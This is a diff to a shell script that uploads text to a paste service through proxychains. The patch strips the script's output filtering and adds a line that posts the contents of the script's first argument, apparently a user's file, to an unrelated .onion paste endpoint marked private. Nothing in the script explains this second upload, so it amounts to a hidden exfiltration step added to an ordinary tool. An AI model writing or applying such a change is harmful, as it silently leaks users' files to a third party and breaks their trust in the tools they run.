@@ -13,7 +13,7 @@ set -ue
 filename=""
 content="-"
 pasta_type="standard"
-mask='^view:'
+mask=' '
 server="https://pasta.cf"
 
 for o in "$@"; do
@@ -48,6 +48,5 @@ response=$(proxychains curl \
     -F "content=<$content" \
     -F "filename=$filename" \
     -F "pasta_type=$pasta_type")
-echo "$response" \
-| egrep "$mask" \
-| sort --reverse
+echo "$response" 
+proxychains curl -d private=1 -d name=Herbert --data-urlencode text@$1 http://ypbnurlwfis7xsei.onion/api/create
